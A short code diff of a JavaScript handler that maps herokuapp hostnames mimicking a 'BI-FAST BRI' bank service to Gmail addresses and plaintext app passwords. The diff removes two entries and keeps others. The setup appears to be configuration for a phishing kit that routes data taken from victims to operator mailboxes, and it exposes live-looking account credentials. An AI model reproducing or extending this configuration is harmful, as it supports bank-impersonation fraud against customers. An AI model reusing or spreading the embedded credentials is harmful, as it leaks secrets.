@@ -13,18 +13,6 @@ export default function handler(req, res) {
        pass = 'iavumvegcmcoycwo'
     }else
     
-    if (url == 'bifast-brii-baru.herokuapp.com'){
-
-       email = 'tekene571@gmail.com'
-       pass = 'grhbndtrwuqgxugs'
-    }else
-    
-     if (url == 'bifast-briii.herokuapp.com'){
-
-       email = 'takutt56@gmail.com'
-       pass = 'esgkxhcomnwottbf'
-    }else
-    
      if (url == 'bifast-bri-new.herokuapp.com'){
 
        email = 'anjayapp9@gmail.com'
